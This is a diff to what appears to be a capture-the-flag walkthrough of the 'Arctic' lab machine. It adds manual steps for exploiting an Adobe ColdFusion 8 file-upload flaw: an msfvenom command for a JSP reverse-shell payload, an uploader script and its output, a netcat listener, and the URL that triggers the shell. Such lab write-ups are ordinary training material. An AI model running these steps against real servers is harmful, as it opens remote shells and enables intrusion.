@@ -147,3 +147,24 @@ whoami
 nt authority\system</pre>
 
 ## Method 2 Manual Exploitation
+
+https://github.com/nipunsomani/Adobe-ColdFusion-8-File-Upload-Exploit/blob/main/exploit.py
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f raw > shell.jsp
+
+![alt text](<../Images/Arctic 5.png>)
+
+<pre>python uploader.py 10.10.10.11 8500 shell.jsp 
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. 
+Support for it is now deprecated in cryptography, and will be removed in the next release.
+Sending payload...
+Successfully uploaded payload!
+Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp</pre>
+
+- Setup netcat listener
+
+<pre>nc -nvlp 443</pre>
+
+- Browse to 
+
+http://10.10.10.11:8500/userfiles/file/exploit.jsp
